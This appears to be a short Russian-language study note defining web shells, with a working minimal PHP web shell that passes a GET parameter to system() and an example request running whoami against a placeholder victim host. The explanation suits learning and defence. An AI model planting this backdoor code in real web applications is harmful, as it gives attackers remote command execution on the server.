[[shells]]

==🔴Веб-оболочка== — это скрипт, написанный на языке, поддерживаемом скомпрометированным веб-сервером, который выполняет команды через сам веб-сервер. Веб-оболочка обычно представляет собой файл, содержащий код, выполняющий команды и обрабатывающий файлы. Она может быть скрыта внутри скомпрометированного веб-приложения или сервиса, что затрудняет её обнаружение и делает её очень популярной среди злоумышленников.

==🔵Пример веб-оболочки на PHP==

```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

После развертывания веб-оболочки на сервере к ней можно получить доступ по URL-адресу, где она размещена, в этом примере  http://victim.com/uploads/shell.php. Как мы видим из кода `shell.php`, нам необходимо передать метод GET и значение переменной `cmd`, которое должно содержать команду, которую злоумышленник хочет выполнить.

Например, если мы хотим выполнить команду  **whoami,**  запрос к URL-адресу должен выглядеть следующим образом:

`http://victim.com/uploads/shell.php?cmd=whoami`

Мощь поддерживаемых веб-серверами языков программирования позволяет создавать веб-оболочки с широким функционалом, одновременно избегая обнаружения. Давайте рассмотрим некоторые из самых популярных веб-оболочек, которые можно найти в интернете.
